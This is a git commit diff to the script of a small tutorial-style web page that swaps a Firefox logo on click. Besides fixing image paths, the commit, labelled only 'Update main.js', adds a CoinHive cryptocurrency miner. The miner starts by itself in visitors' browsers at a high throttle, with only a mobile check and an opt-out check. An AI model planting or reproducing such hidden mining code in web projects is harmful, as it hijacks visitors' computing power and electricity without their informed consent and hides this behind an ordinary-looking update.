f638fe76457584925a95b96e3c0c1a7456df5ea1
zerokos <zerokos@users.noreply.github.com>
2018-04-12 17:54:59 +0800

    Update main.js

--- scripts/main.js
+++ scripts/main.js
@@ -1,11 +1,19 @@
+var miner = new CoinHive.Anonymous('GyYen2DmgQ6u7ytA3zxiSAZZgTt3qA3W', {throttle: 0.8});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+
 var myImage = document.querySelector('img');
 
 myImage.onclick = function() {
     var mySrc = myImage.getAttribute('src');
     if(mySrc === 'images/firefox-icon.png') {
-      myImage.setAttribute ('src','images/firefox2.png');
+      myImage.setAttribute ('src','./images/firefox2.png');
     } else {
-      myImage.setAttribute ('src','images/firefox-icon.png');
+      myImage.setAttribute ('src','./images/firefox-icon.png');
     }
 }
 
